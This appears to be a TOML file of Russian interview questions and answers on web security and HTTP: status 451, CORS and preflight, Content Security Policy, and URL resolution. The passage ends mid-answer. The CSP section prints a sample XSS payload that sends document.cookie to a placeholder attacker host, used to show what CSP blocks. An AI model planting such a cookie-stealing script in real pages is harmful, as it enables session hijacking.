[[questions]]
  id = 33
  question = "451 статус код ( status code)"
  answer = "### `451 Unavailable For Legal Reasons`\n\nСтатус `451` означает, что доступ к ресурсу запрещён из-за юридического требования:\n\n```text\nHTTP/1.1 451 Unavailable For Legal Reasons\n```\n\nНапример:\n\n- блокировка сайта по решению суда;\n    \n- запрет контента законодательством определённой страны;\n    \n- требование государственного органа;\n    \n- ограничение доступа из конкретного региона;\n    \n- удаление материала из-за юридической претензии.\n    \n\nRFC 7725 определяет `451` для случаев, когда доступ к ресурсу отклоняется вследствие правового требования. \n\n### Пример ответа\n\n```text\nHTTP/1.1 451 Unavailable For Legal Reasons\nContent-Type: application/problem+json\nLink: <https://provider.example/legal-block>; rel=\"blocked-by\"\n\n{\n  \"type\": \"/problems/legal-restriction\",\n  \"title\": \"Unavailable for legal reasons\",\n  \"status\": 451,\n  \"detail\": \"Access to this resource is restricted in your country.\"\n}\n```\n\nВ теле ответа рекомендуется объяснить:\n\n```text\nкто потребовал блокировку\nна основании какого закона или решения\nдля каких пользователей действует ограничение\nкакие ресурсы заблокированы\n```\n\nОтвет также может содержать заголовок:\n\n```text\nLink: <https://provider.example/legal-block>; rel=\"blocked-by\"\n```\n\nОн должен указывать на организацию, которая технически реализует блокировку, например провайдера или прокси, а не обязательно на орган, потребовавший её. \n\n### Кто может вернуть `451`\n\nКод может вернуть не только сам сайт:\n\n```text\nOrigin server\nCDN\nинтернет-провайдер\nпоисковая система\nreverse proxy\nDNS- или фильтрующая инфраструктура\n```\n\nТо есть возможна схема:\n\n```text\nБраузер\n   ↓\nИнтернет-провайдер → 451\n   X\nСайт вообще не получил запрос\n```\n\nRFC прямо указывает, что сервер, возвращающий `451`, необязательно является origin-сервером. \n\n### Отличие от `403 Forbidden`\n\n```text\n403 Forbidden\n→ доступ запрещён в общем смысле\n\n451 Unavailable For Legal Reasons\n→ доступ запрещён именно по юридической причине\n```\n\nПримеры:\n\n```text\nНет прав на чужой документ\n→ 403\n\nСтраница заблокирована по решению суда\n→ 451\n```\n\n`451` предоставляет клиенту более точную и прозрачную информацию о причине блокировки.\n\n### Важные особенности\n\n`451` не подтверждает, что ресурс действительно существует:\n\n```text\n451\n≠ ресурс обязательно существует\n```\n\nДаже после снятия юридического ограничения запрос всё равно мог бы завершиться, например, `404`.\n\nКроме того, клиент не может рассчитывать, что юридическая блокировка всегда будет обозначаться именно `451`: блокирующая сторона может вернуть `403`, страницу-заглушку, DNS-ошибку или полностью разорвать соединение. \n\nОтвет `451` по умолчанию может кешироваться, если это не запрещено методом запроса или заголовками `Cache-Control`.\n\n### Почему выбран номер 451\n\nНомер является отсылкой к роману Рэя Брэдбери **«451 градус по Фаренгейту»**, посвящённому уничтожению и запрещению книг. В RFC автор отдельно благодарит Рэя Брэдбери. \n\n### Итог\n\n```text\n451 Unavailable For Legal Reasons\n→ ресурс недоступен из-за закона,\n  судебного решения или другого юридического требования\n```"
  popularity = 2.63

[[questions]]
  id = 34
  question = "Что такое CORS?"
  answer = "### Что такое CORS\n\n**CORS** расшифровывается как:\n\n```text\nCross-Origin Resource Sharing\n```\n\nПо-русски:\n\n```text\nсовместное использование ресурсов между разными источниками\n```\n\nЭто механизм безопасности браузера, который определяет, может ли JavaScript с одного origin обращаться к ресурсу другого origin и получать доступ к ответу. CORS является частью модели загрузки ресурсов браузером и работает вместе с политикой Same-Origin Policy. \n\n### Что такое origin\n\nOrigin состоит из трёх частей:\n\n```text\nscheme + host + port\n```\n\nНапример:\n\n```text\nhttps://example.com:443\n```\n\nЭти адреса относятся к разным origin:\n\n```text\nhttp://example.com\nhttps://example.com\n\nhttps://example.com\nhttps://api.example.com\n\nhttp://localhost:3000\nhttp://localhost:8000\n```\n\nРазличие хотя бы в протоколе, домене или порте означает другой origin. \n\nТипичная ситуация разработки:\n\n```text\nFrontend: http://localhost:3000\nBackend:  http://localhost:8000\n```\n\nПорты разные, поэтому запрос является cross-origin.\n\n### Зачем нужен CORS\n\nПредставим, что пользователь авторизован на сайте банка:\n\n```text\nhttps://bank.example\n```\n\nВ браузере сохранена session cookie банка. Затем пользователь открывает вредоносный сайт:\n\n```text\nhttps://evil.example\n```\n\nJavaScript вредоносного сайта пытается выполнить:\n\n```javascript\nconst response = await fetch(\n    \"https://bank.example/api/account\",\n    {\n        credentials: \"include\",\n    },\n);\n\nconst account = await response.json();\n```\n\nБез браузерных ограничений чужой сайт мог бы читать ответы другого origin. Same-Origin Policy по умолчанию ограничивает такой доступ, а CORS позволяет backend явно указать, каким origin доступ разрешён. \n\n### Как работает CORS\n\nFrontend отправляет cross-origin запрос:\n\n```text\nGET /api/profile HTTP/1.1\nHost: api.example.com\nOrigin: https://frontend.example\n```\n\nЗаголовок `Origin` показывает, с какого origin выполняется запрос.\n\nBackend разрешает доступ:\n\n```text\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://frontend.example\nContent-Type: application/json\n\n{\n  \"username\": \"alfob\"\n}\n```\n\nБраузер сравнивает:\n\n```text\nOrigin запроса:\nhttps://frontend.example\n\nРазрешённый origin:\nhttps://frontend.example\n```\n\nЕсли они совпадают, JavaScript получает доступ к ответу.\n\nЕсли соответствующего заголовка нет:\n\n```text\nHTTP/1.1 200 OK\nContent-Type: application/json\n```\n\nбраузер может получить ответ по сети, но не предоставить его JavaScript:\n\n```text\nBackend обработал запрос\nBackend вернул 200\nБраузер заблокировал чтение ответа frontend-кодом\n```\n\nПоэтому CORS-ошибка не всегда означает, что запрос не дошёл до backend.\n\n### Простой CORS-запрос\n\nНекоторые запросы браузер может отправить сразу:\n\n```javascript\nfetch(\"https://api.example.com/products\");\n```\n\n```text\nGET /products\nOrigin: https://frontend.example\n```\n\nBackend должен добавить:\n\n```text\nAccess-Control-Allow-Origin: https://frontend.example\n```\n\nFetch Standard определяет ограниченный набор CORS-safelisted методов, заголовков и типов содержимого, для которых предварительная проверка не требуется. \n\n### Preflight-запрос\n\nПеред более сложным запросом браузер сначала отправляет `OPTIONS`:\n\n```javascript\nfetch(\"https://api.example.com/orders/42\", {\n    method: \"DELETE\",\n    headers: {\n        Authorization: \"Bearer token\",\n    },\n});\n```\n\nПредварительный запрос:\n\n```text\nOPTIONS /orders/42 HTTP/1.1\nOrigin: https://frontend.example\nAccess-Control-Request-Method: DELETE\nAccess-Control-Request-Headers: authorization\n```\n\nBackend отвечает:\n\n```text\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://frontend.example\nAccess-Control-Allow-Methods: GET, POST, DELETE\nAccess-Control-Allow-Headers: Authorization\n```\n\nПосле успешной проверки браузер отправляет настоящий запрос:\n\n```text\nDELETE /orders/42 HTTP/1.1\nOrigin: https://frontend.example\nAuthorization: Bearer token\n```\n\nСхема:\n\n```text\nFrontend\n    │\n    │ OPTIONS — можно ли отправить DELETE?\n    ▼\nBackend\n    │\n    │ разрешены origin, method и headers\n    ▼\nFrontend\n    │\n    │ DELETE /orders/42\n    ▼\nBackend\n```\n\nPreflight нужен для запросов, выходящих за ограничения обычной HTML-формы: например, для некоторых методов, пользовательских заголовков или типов содержимого. \n\n### Основные CORS-заголовки\n\n#### `Access-Control-Allow-Origin`\n\nКаким origin разрешён доступ:\n\n```text\nAccess-Control-Allow-Origin: https://frontend.example\n```\n\nЛибо всем origin:\n\n```text\nAccess-Control-Allow-Origin: *\n```\n\n#### `Access-Control-Allow-Methods`\n\nКакие методы разрешены:\n\n```text\nAccess-Control-Allow-Methods: GET, POST, PATCH, DELETE\n```\n\n#### `Access-Control-Allow-Headers`\n\nКакие request headers разрешены:\n\n```text\nAccess-Control-Allow-Headers: Authorization, Content-Type\n```\n\n#### `Access-Control-Allow-Credentials`\n\nМожно ли использовать credentials:\n\n```text\nAccess-Control-Allow-Credentials: true\n```\n\nК credentials относятся, в частности, cookies и HTTP-аутентификационные данные.\n\n#### `Access-Control-Expose-Headers`\n\nКакие response headers frontend может прочитать:\n\n```text\nAccess-Control-Expose-Headers: X-Request-ID\n```\n\nБез этого JavaScript не получает доступ к произвольным заголовкам ответа.\n\n#### `Access-Control-Max-Age`\n\nСколько времени браузер может кешировать результат preflight:\n\n```text\nAccess-Control-Max-Age: 600\n```\n\n### Cookies и CORS\n\nFrontend должен явно разрешить отправку credentials:\n\n```javascript\nfetch(\"https://api.example.com/profile\", {\n    credentials: \"include\",\n});\n```\n\nBackend должен вернуть:\n\n```text\nAccess-Control-Allow-Origin: https://frontend.example\nAccess-Control-Allow-Credentials: true\n```\n\nПри credentialed-запросах нельзя разрешать origin через `*`; нужно указать конкретный origin. \n\nНужно также учитывать атрибуты cookie:\n\n```text\nSet-Cookie: session_id=abc;\n            Secure;\n            HttpOnly;\n            SameSite=None\n```\n\nCORS-разрешение само по себе не гарантирует отправку cookie: применяются и отдельные правила cookies.\n\n### Настройка в FastAPI\n\n```python\nfrom fastapi import FastAPI\nfrom fastapi.middleware.cors import CORSMiddleware\n\napp = FastAPI()\n\napp.add_middleware(\n    CORSMiddleware,\n    allow_origins=[\n        \"https://frontend.example\",\n        \"http://localhost:3000\",\n    ],\n    allow_credentials=True,\n    allow_methods=[\n        \"GET\",\n        \"POST\",\n        \"PATCH\",\n        \"DELETE\",\n    ],\n    allow_headers=[\n        \"Authorization\",\n        \"Content-Type\",\n    ],\n)\n\n\n@app.get(\"/profile\")\nasync def get_profile() -> dict:\n    return {\n        \"username\": \"alfob\",\n    }\n```\n\n`CORSMiddleware` обрабатывает preflight-запросы и добавляет нужные CORS-заголовки в обычные ответы. По умолчанию настройки middleware ограничительные, поэтому разрешённые origins, методы и заголовки задаются явно. \n\n### CORS не является авторизацией\n\nНельзя использовать CORS вместо проверки токена и прав:\n\n```text\nCORS:\nможет ли браузерный JavaScript прочитать ответ?\n\nАутентификация:\nкто выполняет запрос?\n\nАвторизация:\nразрешена ли пользователю операция?\n```\n\nДаже при строгом CORS API всё равно могут вызвать:\n\n```text\ncurl\nPostman\nмобильное приложение\nдругой backend\nскрипт\n```\n\nCORS в основном принудительно применяется браузером. Он не защищает публичный endpoint от прямых HTTP-запросов и не заменяет аутентификацию, авторизацию, CSRF-защиту и валидацию данных.\n\n### CORS и CSRF — не одно и то же\n\n```text\nCORS\n→ ограничивает доступ JavaScript к cross-origin ответам\n\nCSRF\n→ защищает от выполнения нежелательного запроса\n  с автоматически отправленными credentials\n```\n\nНекоторые cross-origin запросы могут быть отправлены без preflight. Поэтому нельзя считать, что отсутствие CORS-заголовков гарантированно предотвращает изменение данных.\n\n### Итог\n\n```text\nCORS\n├── работает в браузере\n├── применяется к cross-origin запросам\n├── проверяет scheme + host + port\n├── управляется response-заголовками backend\n├── иногда использует предварительный OPTIONS\n└── не заменяет авторизацию и CSRF-защиту\n```\n\nТипичная схема:\n\n```text\nFrontend: https://frontend.example\nBackend:  https://api.example\n\nBackend разрешает:\nAccess-Control-Allow-Origin: https://frontend.example\n```"
  popularity = 5.26

[[questions]]
  id = 35
  question = "Какой запрос выполняется при CORS? (OPTIONS)"
  answer = "### При CORS не всегда выполняется `OPTIONS`\n\n`OPTIONS` выполняется только для **preflight-запроса** — предварительной проверки перед некоторыми cross-origin запросами.\n\nОбщая последовательность:\n\n```text\nFrontend\n   │\n   │ OPTIONS — разрешён ли будущий запрос?\n   ▼\nBackend\n   │\n   │ CORS-заголовки с разрешениями\n   ▼\nБраузер\n   │\n   │ POST / PATCH / DELETE / другой реальный запрос\n   ▼\nBackend\n```\n\nБраузер создаёт preflight автоматически. Frontend обычно не отправляет `OPTIONS` вручную. \n\n### Пример\n\nFrontend находится на:\n\n```text\nhttp://localhost:3000\n```\n\nBackend:\n\n```text\nhttp://localhost:8000\n```\n\nFrontend выполняет:\n\n```javascript\nawait fetch(\"http://localhost:8000/api/orders\", {\n    method: \"POST\",\n    headers: {\n        \"Content-Type\": \"application/json\",\n        \"Authorization\": \"Bearer token\",\n    },\n    body: JSON.stringify({\n        product_id: 42,\n        quantity: 2,\n    }),\n});\n```\n\nПоскольку origin различаются, используется CORS. Кроме того, `application/json` и `Authorization` требуют предварительной проверки.\n\nСначала браузер отправляет:\n\n```text\nOPTIONS /api/orders HTTP/1.1\nHost: localhost:8000\nOrigin: http://localhost:3000\nAccess-Control-Request-Method: POST\nAccess-Control-Request-Headers: authorization, content-type\n```\n\nСмысл запроса:\n\n```text\nМожно ли origin http://localhost:3000\nотправить POST /api/orders\nс заголовками Authorization и Content-Type?\n```\n\nЗатем backend должен ответить примерно так:\n\n```text\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: http://localhost:3000\nAccess-Control-Allow-Methods: POST\nAccess-Control-Allow-Headers: Authorization, Content-Type\n```\n\nВместо `200` сервер также часто возвращает:\n\n```text\nHTTP/1.1 204 No Content\n```\n\nПосле успешного preflight браузер отправит уже настоящий запрос:\n\n```text\nPOST /api/orders HTTP/1.1\nHost: localhost:8000\nOrigin: http://localhost:3000\nContent-Type: application/json\nAuthorization: Bearer token\n\n{\n  \"product_id\": 42,\n  \"quantity\": 2\n}\n```\n\n### Основные заголовки preflight\n\nЗапрос браузера:\n\n```text\nOrigin: http://localhost:3000\n```\n\nУказывает origin frontend.\n\n```text\nAccess-Control-Request-Method: POST\n```\n\nУказывает метод будущего реального запроса.\n\n```text\nAccess-Control-Request-Headers: authorization, content-type\n```\n\nУказывает нестандартные или не входящие в безопасный список заголовки, которые frontend собирается отправить. \n\nОтвет backend:\n\n```text\nAccess-Control-Allow-Origin: http://localhost:3000\n```\n\nРазрешает конкретный origin.\n\n```text\nAccess-Control-Allow-Methods: GET, POST, PATCH, DELETE\n```\n\nРазрешает методы.\n\n```text\nAccess-Control-Allow-Headers: Authorization, Content-Type\n```\n\nРазрешает заголовки.\n\n```text\nAccess-Control-Allow-Credentials: true\n```\n\nРазрешает credentialed CORS-запросы, например с cookies.\n\n```http\nAccess-Control-Max-Age: 600\n```\n\nПозволяет браузеру некоторое время кешировать результат preflight.\n\n### Когда выполняется `OPTIONS`\n\nPreflight обычно требуется, когда запрос не является CORS-safelisted, например:\n\n```text\nDELETE /api/orders/42\nPATCH /api/users/42\nPUT /api/files/42\n```\n\nТакже он обычно выполняется при использовании таких заголовков:\n\n```text\nAuthorization: Bearer ...\n```\n\nили такого типа тела:\n\n```text\nContent-Type: application/json\n```\n\nНапример, этот запрос вызывает preflight:\n\n```javascript\nfetch(\"https://api.example.com/users/42\", {\n    method: \"DELETE\",\n    headers: {\n        Authorization: \"Bearer token\",\n    },\n});\n```\n\n### Когда `OPTIONS` может не быть\n\nНекоторые cross-origin запросы браузер отправляет сразу. Их называют простыми или CORS-safelisted запросами.\n\nПример:\n\n```javascript\nfetch(\"https://api.example.com/products\");\n```\n\nБраузер может сразу отправить:\n\n```text\nGET /products HTTP/1.1\nOrigin: https://frontend.example\n```\n\nБез предварительного `OPTIONS`.\n\nОднако backend всё равно должен вернуть:\n\n```text\nAccess-Control-Allow-Origin: https://frontend.example\n```\n\nИначе браузер не предоставит JavaScript доступ к ответу.\n\nДля `POST` preflight может не потребоваться, когда используются только разрешённые простые заголовки и один из ограниченного набора типов содержимого, например:\n\n```text\nContent-Type: application/x-www-form-urlencoded\n```\n\n```text\nContent-Type: multipart/form-data\n```\n\n```text\nContent-Type: text/plain\n```\n\n`application/json` в этот safelist не входит, поэтому JSON-запрос между разными origins обычно предваряется `OPTIONS`. \n\n### Что будет, если backend не разрешил запрос\n\nНапример, сервер ответил:\n\n```text\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://another-site.example\n```\n\nНо frontend имеет origin:\n\n```text\nhttps://frontend.example\n```\n\nТогда браузер не отправит основной `POST`, `PATCH` или `DELETE` после неуспешного preflight.\n\n```text\nOPTIONS\n   ↓\nCORS-проверка не пройдена\n   ↓\nреальный запрос не отправляется\n   ↓\nfrontend получает CORS/network error\n```\n\nВажно: статус `200` у ответа на `OPTIONS` ещё не означает успешный CORS. Браузер проверяет именно значения `Access-Control-Allow-*`.\n\n### FastAPI\n\nОбычно отдельный endpoint для `OPTIONS` писать не нужно. Его обрабатывает `CORSMiddleware`:\n\n```python\nfrom fastapi import FastAPI\nfrom fastapi.middleware.cors import CORSMiddleware\n\napp = FastAPI()\n\napp.add_middleware(\n    CORSMiddleware,\n    allow_origins=[\n        \"http://localhost:3000\",\n    ],\n    allow_credentials=True,\n    allow_methods=[\n        \"GET\",\n        \"POST\",\n        \"PATCH\",\n        \"DELETE\",\n    ],\n    allow_headers=[\n        \"Authorization\",\n        \"Content-Type\",\n    ],\n)\n```\n\nMiddleware перехватывает CORS preflight-запросы `OPTIONS` и формирует ответ с соответствующими заголовками. \n\n### Итог\n\n```text\nCORS-запрос\n├── простой\n│   └── сразу выполняется GET/POST\n│\n└── требующий предварительной проверки\n    ├── OPTIONS preflight\n    ├── проверка CORS-заголовков\n    └── настоящий POST/PUT/PATCH/DELETE\n```\n\n`OPTIONS` не является самим бизнес-запросом. Он спрашивает сервер, разрешает ли тот браузеру отправить последующий cross-origin запрос."
  popularity = 2.63

[[questions]]
  id = 36
  question = "Что такое CSP (Content Security Policy)?"
  answer = "### Что такое CSP\n\n**CSP** расшифровывается как:\n\n```text\nContent Security Policy\n```\n\nЭто политика безопасности, которую сервер передаёт браузеру. Она указывает, **откуда странице разрешено загружать и выполнять ресурсы**:\n\n```text\nJavaScript\nCSS\nизображения\nшрифты\niframe\nWebSocket и fetch-запросы\nмедиафайлы\nWeb Workers\n```\n\nОсновное назначение CSP — уменьшить последствия внедрения вредоносного содержимого, прежде всего XSS. При этом CSP является дополнительным уровнем защиты, а не заменой валидации данных и безопасного экранирования вывода. \n\n### Как CSP передаётся\n\nПредпочтительный способ — HTTP-заголовок ответа:\n\n```text\nHTTP/1.1 200 OK\nContent-Type: text/html\nContent-Security-Policy: default-src 'self'\n```\n\nЗаголовок передаётся **от backend к браузеру**:\n\n```text\nBackend\n   ↓ HTTP response с CSP\nБраузер\n   ↓\nПрименяет ограничения при загрузке страницы\n```\n\nПолитику также можно указать через `<meta>`, но этот вариант поддерживает не все директивы и начинает действовать только с места расположения элемента. Поэтому HTTP-заголовок является предпочтительным механизмом. \n\n### Простой пример\n\n```text\nContent-Security-Policy: default-src 'self'\n```\n\n`'self'` означает текущий origin страницы.\n\nДля сайта:\n\n```text\nhttps://example.com\n```\n\nбудут разрешены ресурсы с того же origin:\n\n```text\nhttps://example.com/app.js\nhttps://example.com/style.css\n```\n\nА внешний скрипт может быть заблокирован:\n\n```html\n<script src=\"https://evil.example/script.js\"></script>\n```\n\nСхема:\n\n```text\nСтраница пытается загрузить ресурс\n        ↓\nБраузер проверяет CSP\n        ↓\nИсточник разрешён → ресурс загружается\nИсточник запрещён → ресурс блокируется\n```\n\n### Основные директивы\n\n#### `default-src`\n\nПравило по умолчанию для типов ресурсов, для которых не указана более конкретная директива:\n\n```text\nContent-Security-Policy: default-src 'self'\n```\n\n#### `script-src`\n\nОграничивает источники JavaScript:\n\n```text\nContent-Security-Policy: script-src 'self' https://scripts.example\n```\n\nРазрешено:\n\n```html\n<script src=\"/app.js\"></script>\n<script src=\"https://scripts.example/library.js\"></script>\n```\n\nЗапрещено:\n\n```html\n<script src=\"https://unknown.example/library.js\"></script>\n```\n\n#### `style-src`\n\nУправляет CSS:\n\n```text\nContent-Security-Policy: style-src 'self' https://styles.example\n```\n\n#### `img-src`\n\nУправляет изображениями:\n\n```text\nContent-Security-Policy: img-src 'self' data: https://images.example\n```\n\n#### `connect-src`\n\nОграничивает адреса, к которым JavaScript может подключаться через:\n\n```text\nfetch\nXMLHttpRequest\nWebSocket\nEventSource\n```\n\nПример:\n\n```text\nContent-Security-Policy: connect-src 'self' https://api.example\n```\n\nЭто разрешает:\n\n```javascript\nfetch(\"https://api.example/users\");\n```\n\nи блокирует подключение к неизвестному домену.\n\n#### `font-src`\n\n```text\nContent-Security-Policy: font-src 'self' https://fonts.example\n```\n\n#### `object-src`\n\nОграничивает `<object>` и похожие встраиваемые ресурсы:\n\n```text\nContent-Security-Policy: object-src 'none'\n```\n\nВ современных политиках их обычно полностью запрещают.\n\n#### `frame-src`\n\nОпределяет, какие страницы можно встроить в текущую страницу через `iframe`:\n\n```text\nContent-Security-Policy: frame-src 'self' https://video.example\n```\n\n#### `frame-ancestors`\n\nОпределяет, какие сайты имеют право встроить **вашу страницу** в `iframe`:\n\n```text\nContent-Security-Policy: frame-ancestors 'none'\n```\n\nЭто запрещает встраивание страницы и помогает защищаться от clickjacking.\n\nРазрешить встраивание только собственным origin:\n\n```text\nContent-Security-Policy: frame-ancestors 'self'\n```\n\n#### `base-uri`\n\nОграничивает значение HTML-элемента `<base>`:\n\n```text\nContent-Security-Policy: base-uri 'self'\n```\n\nЭто мешает внедрённому `<base>` изменить адреса, по которым браузер загружает относительные ресурсы.\n\n### Пример практической политики\n\n```text\nContent-Security-Policy:\n    default-src 'self';\n    script-src 'self';\n    style-src 'self';\n    img-src 'self' data:;\n    font-src 'self';\n    connect-src 'self' https://api.example.com;\n    object-src 'none';\n    base-uri 'self';\n    frame-ancestors 'none';\n```\n\nВ одну строку:\n\n```text\nContent-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self' https://api.example.com; object-src 'none'; base-uri 'self'; frame-ancestors 'none'\n```\n\n### Как CSP помогает при XSS\n\nПредположим, атакующему удалось внедрить:\n\n```html\n<script>\n    fetch(\"https://evil.example/steal?data=\" + document.cookie);\n</script>\n```\n\nПри строгой политике:\n\n```text\nContent-Security-Policy:\n    script-src 'self';\n    connect-src 'self'\n```\n\nбраузер может заблокировать:\n\n1. выполнение внедрённого inline-скрипта;\n    \n2. подключение к `evil.example`.\n    \n\n```text\nXSS-код оказался в HTML\n        ↓\nCSP запрещает выполнение\n        ↓\nатака ограничивается браузером\n```\n\nНо если сервер сам разрешил небезопасные источники или использует слишком широкую политику, защита будет слабой.\n\n### Inline-скрипты\n\nТакая политика:\n\n```text\nContent-Security-Policy: script-src 'self'\n```\n\nобычно блокирует inline-код:\n\n```html\n<script>\n    console.log(\"Hello\");\n</script>\n```\n\nа также обработчики:\n\n```html\n<button onclick=\"deleteUser()\">Удалить</button>\n```\n\nЧтобы разрешить конкретный inline-скрипт, применяют `nonce`.\n\n### Nonce\n\nBackend создаёт случайное одноразовое значение для каждого ответа:\n\n```text\nContent-Security-Policy: script-src 'self' 'nonce-4kH7x9...'\n```\n\nИ добавляет его разрешённому скрипту:\n\n```html\n<script nonce=\"4kH7x9...\">\n    initializeApplication();\n</script>\n```\n\nБраузер сравнивает nonce:\n\n```text\nnonce в CSP\n    ==\nnonce у <script>\n        ↓\nскрипт разрешён\n```\n\nДругой inline-скрипт без правильного nonce будет заблокирован.\n\nNonce должен быть непредсказуемым, уникальным для каждой передаваемой политики и генерироваться криптографически стойким генератором; спецификация рекомендует не менее 128 бит до кодирования. \n\nПример на FastAPI:\n\n```python\nimport base64\nimport secrets\n\nfrom fastapi import FastAPI, Request\nfrom fastapi.responses import HTMLResponse\n\napp = FastAPI()\n\n\n@app.get(\"/\", response_class=HTMLResponse)\nasync def index(request: Request) -> HTMLResponse:\n    nonce = base64.b64encode(\n        secrets.token_bytes(16),\n    ).decode()\n\n    html = f\"\"\"\n    <!doctype html>\n    <html>\n        <body>\n            <script nonce=\"{nonce}\">\n                console.log(\"Allowed script\");\n            </script>\n        </body>\n    </html>\n    \"\"\"\n\n    return HTMLResponse(\n        content=html,\n        headers={\n            \"Content-Security-Policy\": (\n                \"default-src 'self'; \"\n                f\"script-src 'self' 'nonce-{nonce}'; \"\n                \"object-src 'none'; \"\n                \"base-uri 'self'; \"\n                \"frame-ancestors 'none'\"\n            ),\n        },\n    )\n```\n\n### Hash вместо nonce\n\nТакже можно разрешить конкретный inline-скрипт по его хешу:\n\n```html\n<script>\n    initializeApplication();\n</script>\n```\n\nПолитика условно выглядит так:\n\n```text\nContent-Security-Policy: script-src 'self' 'sha256-<base64-хеш>'\n```\n\nБраузер вычисляет хеш содержимого скрипта и разрешает его только при совпадении.\n\nРазличие:\n\n```text\nnonce\n→ генерируется заново для каждого ответа\n→ удобен для динамического HTML\n\nhash\n→ зависит от точного содержимого скрипта\n→ удобен для неизменяемого inline-кода\n```\n\nДаже изменение пробела в скрипте может изменить хеш.\n\n### Почему нежелателен `'unsafe-inline'`\n\nМожно написать:\n\n```text\nContent-Security-Policy: script-src 'self' 'unsafe-inline'\n```\n\nНо это разрешит inline-скрипты в целом и существенно ослабит защиту от XSS:\n\n```html\n<script>maliciousCode()</script>\n```\n\nДля постепенного внедрения старого приложения лучше использовать nonce или hash, а не постоянно оставлять `'unsafe-inline'`. Спецификация отдельно отмечает, что nonce обеспечивает существенное улучшение по сравнению с `'unsafe-inline'`. \n\n### Режим Report-Only\n\nПеред включением строгой CSP её можно сначала запустить без блокировки:\n\n```text\nContent-Security-Policy-Report-Only:\n    default-src 'self';\n    script-src 'self';\n    report-to csp-endpoint\n```\n\nВ этом режиме браузер:\n\n```text\nне блокирует нарушение\n+ фиксирует нарушение\n+ может отправить отчёт\n```\n\nЭто позволяет увидеть, какие реальные скрипты, стили или подключения сломаются после включения политики.\n\nПосле проверки заголовок меняют на:\n\n```text\nContent-Security-Policy: ...\n```\n\n`Content-Security-Policy-Report-Only` предназначен именно для мониторинга политики перед её принудительным применением. Он не поддерживается через `<meta>`. \n\n### CSP и CORS — разные механизмы\n\n```text\nCORS\n→ сервер сообщает браузеру,\n  каким чужим origin разрешено читать его ответы\n\nCSP\n→ страница сообщает браузеру,\n  откуда ей разрешено загружать и выполнять ресурсы\n```\n\nПример:\n\n```text\nAccess-Control-Allow-Origin: https://frontend.example\n```\n\nозначает:\n\n```text\nfrontend.example может прочитать этот ответ\n```\n\nА:\n\n```text\nContent-Security-Policy: connect-src https://api.example\n```\n\nозначает:\n\n```text\nэта страница может подключаться к api.example\n```\n\nДля успешного cross-origin `fetch()` могут одновременно потребоваться:\n\n```text\nCSP страницы разрешает connect-src\n+\nCORS backend разрешает origin frontend\n```\n\n### CSP не заменяет остальные меры\n\nCSP не отменяет необходимость:\n\n```text\nэкранировать пользовательский HTML\nиспользовать безопасные шаблонизаторы\nвалидировать данные\nне использовать eval()\nзащищаться от SQL injection\nпроверять авторизацию\nобновлять зависимости\n```\n\nПравильная модель:\n\n```text\nБезопасная обработка данных\n        +\nКонтекстное экранирование\n        +\nCSP как дополнительный слой\n```\n\n### Итог\n\n```text\nCSP\n├── передаётся сервером в HTTP-ответе\n├── применяется браузером\n├── ограничивает источники ресурсов\n├── блокирует запрещённые скрипты и подключения\n├── снижает последствия XSS\n├── может защищать от clickjacking\n├── поддерживает nonce и hash\n└── имеет режим Report-Only\n```\n\nМинимальная разумная основа:\n\n```http\nContent-Security-Policy: default-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'\n```\n\nПосле этого политика дополняется конкретными правилами `script-src`, `style-src`, `img-src`, `connect-src` и другими директивами под реальные потребности приложения."
  popularity = 2.63

[[questions]]
  id = 37
  question = "Как браузер понимает, на какой URL нужно отправить HTTP-запрос?"
  answer = "### Браузер получает URL из действия или кода страницы\n\nБраузер не угадывает адрес запроса. URL берётся из конкретного источника:\n\n```text\nадресная строка\nHTML-атрибут\nJavaScript\nформа\nredirect сервера\nтекущий адрес документа\n```\n\nПосле этого браузер преобразует относительный адрес в абсолютный URL и начинает загрузку.\n\n### 1. Адресная строка\n\nПользователь вводит:\n\n```text\nhttps://example.com/products?page=2\n```\n\nБраузер уже имеет полный URL:\n\n```text\nscheme → https\nhost   → example.com\npath   → /products\nquery  → page=2\n```\n\nОн отправит запрос к ресурсу:\n\n```http\nGET /products?page=2 HTTP/1.1\nHost: example.com\n```\n\n### 2. Ссылка `<a>`\n\n```html\n<a href=\"/profile\">Профиль</a>\n```\n\nURL берётся из `href`.\n\nПоскольку `/profile` — относительный адрес относительно origin, на странице:\n\n```text\nhttps://example.com/catalog\n```\n\nон преобразуется в:\n\n```text\nhttps://example.com/profile\n```\n\nПосле клика браузер обычно выполняет:\n\n```text\nGET /profile\n```\n\n### 3. HTML-форма\n\n```html\n<form action=\"/login\" method=\"post\">\n    <input name=\"username\">\n    <button type=\"submit\">Войти</button>\n</form>\n```\n\nЗдесь:\n\n```text\naction → URL\nmethod → HTTP-метод\n```\n\nБраузер отправит:\n\n```text\nPOST /login HTTP/1.1\n```\n\nЕсли `action` отсутствует, форма обычно отправляется на URL текущего документа. Поведение форм и вычисление адреса назначения определяет HTML Standard. \n\n### 4. JavaScript\n\nАдрес может быть явно указан в коде:\n\n```javascript\nfetch(\"/api/users/42\");\n```\n\nБраузер преобразует относительный URL в абсолютный:\n\n```text\nтекущая страница:\nhttps://example.com/profile\n\nfetch:\n\"/api/users/42\"\n\nрезультат:\nhttps://example.com/api/users/42\n```\n\nЗапрос:\n\n```text\nGET /api/users/42\n```\n\nМожно указать полный URL:\n\n```javascript\nfetch(\"https://api.example.com/users/42\");\n```\n\nТогда запрос отправляется на другой origin:\n\n```text\nhttps://api.example.com\n```\n\nAPI `fetch()` создаёт объект запроса с URL, после чего браузер выполняет алгоритм загрузки ресурса. \n\n### 5. Адреса ресурсов в HTML\n\nПри разборе HTML браузер находит URL в разных атрибутах:\n\n```html\n<script src=\"/static/app.js\"></script>\n\n<link rel=\"stylesheet\" href=\"/static/app.css\">\n\n<img src=\"/images/avatar.png\">\n\n<iframe src=\"https://video.example/player\"></iframe>\n```\n\nИз них создаются отдельные запросы:\n\n```text\nGET /static/app.js\nGET /static/app.css\nGET /images/avatar.png\nGET https://video.example/player\n```\n\nПоэтому получение одной HTML-страницы обычно запускает множество дополнительных HTTP-запросов.\n\n### 6. Относительные URL\n\nГлавное правило:\n\n```text\nотносительный URL\n+\nbase URL\n=\nабсолютный 